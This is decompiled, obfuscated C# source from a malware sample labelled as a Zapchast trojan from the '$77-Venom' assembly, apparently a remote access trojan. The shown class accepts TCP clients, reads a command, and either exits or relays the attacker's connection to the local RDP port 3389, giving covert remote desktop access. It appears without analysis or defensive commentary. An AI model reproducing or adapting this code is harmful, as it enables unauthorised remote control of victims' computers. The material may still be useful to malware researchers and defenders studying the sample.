// Decompiled with JetBrains decompiler
// Type: ⮩ベ堉튚ჟ⨫蟦�늣摊휣땧␨옍箾ᑷꯨ摦֌
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C
{
  private static 쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uFFFDⳬﯭ欎旟\uF32Aಗి\u0FF0갩節ﮠ㯨\u1AAD\uF5B6燈䔅뛈魺\u2BB5 \uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁;

  public static void 䥆깖滗\uE667ꙅⴾ폙ꃷ\uFFFD덗ḑ㝫\uD99D\uDD97횒菅迍슿ঁ첟(
    TcpClient client,
    쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uFFFDⳬﯭ欎旟\uF32Aಗి\u0FF0갩節ﮠ㯨\u1AAD\uF5B6燈䔅뛈魺\u2BB5 notify)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uEC7E癥\uFFFDﱁ\uE791\uFFFD֯\uEA2E钣흺윐\u32A8쇤갋䤏䭫\u2A9A땠엮\u29AE 癥ﱁ֯钣흺윐쇤갋䤏䭫땠엮 = new \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uEC7E癥\uFFFDﱁ\uE791\uFFFD֯\uEA2E钣흺윐\u32A8쇤갋䤏䭫\u2A9A땠엮\u29AE();
    // ISSUE: reference to a compiler-generated field
    癥ﱁ֯钣흺윐쇤갋䤏䭫땠엮.\u0F97叕宅聸\u28E7䌟閶㥸줱ʛ㭢諳ⳙᾤ㥿贽ﱞ쿼ఇㇽ = client;
    \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁 = notify;
    // ISSUE: reference to a compiler-generated method
    // ISSUE: reference to a compiler-generated field
    new Thread(new ThreadStart(癥ﱁ֯钣흺윐쇤갋䤏䭫땠엮.鐤셸锴ⰽ薹톬덟鄺驨\uED29挤먮쌧곁澞㣴鰋\uEA27꧶\u279C)).Start((object) 癥ﱁ֯钣흺윐쇤갋䤏䭫땠엮.\u0F97叕宅聸\u28E7䌟閶㥸줱ʛ㭢諳ⳙᾤ㥿贽ﱞ쿼ఇㇽ);
  }

  private static void 妋ꔶ全\uFFFD䐑ᝰ턃儻延쭳㼹먊춘㙬恶횒툮\u2BE8븅娩(TcpClient client)
  {
    NetworkStream stream;
    try
    {
      stream = client.GetStream();
    }
    catch (Exception ex)
    {
      \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁();
      return;
    }
    string str = \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.줚\u2F53㸼嘞羂ꮣᢲýꈫ淰ぬ텉\u23C9\uEB2B쾨䮤但\uEBF2\uEFB3凔(stream);
    if (str == "")
      \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁();
    else if (str.Contains("EXIT"))
    {
      쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.襘䲸\u0E8B\u09B5䶆㜶\uFAEDꞌ\uEED8\uE86E\uE5AA\uEB39蕚氂偒匝볮\u2038\u2FC9췐 = false;
      쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.\uF55A牂爽ۮ閦菠\uE949パ\uFE1B酶䦩\uF5CE羰匦\uE7BD㹟埴貕路ぢ();
      Application.Exit();
    }
    else
    {
      try
      {
        TcpClient server = new TcpClient("localhost", 3389);
        new \uFFFD\uFAFA쑳\uE674꺜緝ꒂ\u055E干蕽톐䌿\u0BA5陞㨂穝\uF4F0\uED86鑬냕().\uFFFD氙죁͏\uE427瀜継鼄ꀻ嵼泰\uF259\uF4CA\u20CB幇\uF88C䙫\uF73A복\u2378(client, stream, server, \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁);
        \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁();
      }
      catch (Exception ex)
      {
        \u2BA9\uF072ベ堉튚ჟ\u2A2B蟦\uFFFD늣摊휣땧\u2428옍箾ᑷꯨ摦\u058C.\uF68D䘑敊會㢥뎩秌ꫜ燣ꃣ\u0588腵뭱勵䧪硵̪ͅ涣㢁();
        client.Close();
      }
    }
  }

  private static string 줚\u2F53㸼嘞羂ꮣᢲýꈫ淰ぬ텉\u23C9\uEB2B쾨䮤但\uEBF2\uEFB3凔(NetworkStream strem)
  {
    try
    {
      byte[] numArray = new byte[1];
      StringBuilder stringBuilder = new StringBuilder();
      while (쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.襘䲸\u0E8B\u09B5䶆㜶\uFAEDꞌ\uEED8\uE86E\uE5AA\uEB39蕚氂偒匝볮\u2038\u2FC9췐)
      {
        int count = strem.Read(numArray, 0, numArray.Length);
        if (count != 0)
        {
          stringBuilder.Append(Encoding.ASCII.GetString(numArray, 0, count));
          if (stringBuilder.ToString().EndsWith("\r\n\r\n"))
            break;
        }
        else
          break;
      }
      return stringBuilder.ToString();
    }
    catch (Exception ex)
    {
      return "";
    }
  }
}
